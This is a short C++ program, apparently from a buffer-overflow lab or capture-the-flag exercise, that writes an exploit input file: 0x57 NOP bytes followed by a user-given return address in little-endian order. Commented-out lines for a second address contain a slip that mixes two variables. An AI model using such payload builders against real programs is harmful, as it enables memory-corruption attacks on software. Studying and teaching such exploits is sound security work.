#include<iostream>
#include<fstream>
#include<string>
#include<assert.h>
using namespace std;

int main() {
	string filename;
	cout << "filename: ";	cin >> filename;
	ofstream fout(filename + ".txt");	assert(fout.is_open());
	int len(0x57);
	//cout << "len: ";	cin >> len;
	string target;
	cout << "target: ";	cin >> target;
	for(int i = 0; i < len; ++i) {
		fout << "90 ";
	}
	for(int i = 0; i < 4; ++i) {
		fout << target[8 - i * 2 - 2] << target[8 - i * 2 - 1] << " ";
	}
	//for(int i = 0; i < 0x98; ++i) {
	//	fout << ""
	//}
	//string address;
	//cout << "function address: ";	cin >> address;
	//for(int i = 0; i < 4; ++i) {
	//	fout << address[8 - i * 2 - 2] << target[8 - i * 2 - 1] << " ";
	//}
	fout << "00" << endl;
	fout.close();
	return 0;
}
